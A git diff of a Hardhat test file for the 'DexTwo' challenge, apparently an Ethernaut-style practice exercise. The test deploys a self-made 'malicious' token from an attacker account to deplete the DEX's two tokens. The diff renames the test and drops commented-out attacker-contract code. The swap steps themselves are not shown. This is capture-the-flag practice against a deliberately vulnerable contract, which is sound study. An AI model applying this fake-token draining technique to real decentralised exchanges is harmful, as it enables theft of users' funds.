@@ -3,7 +3,7 @@ import { ethers } from "hardhat";
 
 describe("DexTwo", async function () {
 
-  it("Should deplete one of the tokens", async function () {
+  it("Should deplete both tokens", async function () {
     const [signer, attacker] = await ethers.getSigners()
 
     const DexTwo = await ethers.getContractFactory("DexTwo");
@@ -20,10 +20,6 @@ describe("DexTwo", async function () {
     const maliciousToken = await SwappableToken.connect(attacker).deploy(dexTwo.address, "MALTOKEN", "MAL", 1000);
     await maliciousToken.deployed();
 
-    // const DexTwoAttacker = await ethers.getContractFactory("DexTwoAttacker");
-    // const dexTwoAttacker = await DexTwoAttacker.deploy(dexTwo.address, token1.address, token2.address);
-    // await dexTwoAttacker.deployed();
-
     await dexTwo.setTokens(token1.address, token2.address)
 
     await token1.transfer(dexTwo.address, 100)
@@ -33,7 +29,6 @@ describe("DexTwo", async function () {
     await token1.transfer(attacker.address, 10)
     await token2.transfer(attacker.address, 10)
 
-    // await dexTwoAttacker.callSwap()
     await maliciousToken.connect(attacker).transfer(dexTwo.address, 100)
 
     await maliciousToken.connect(attacker)["approve(address,uint256)"](dexTwo.address, 300)
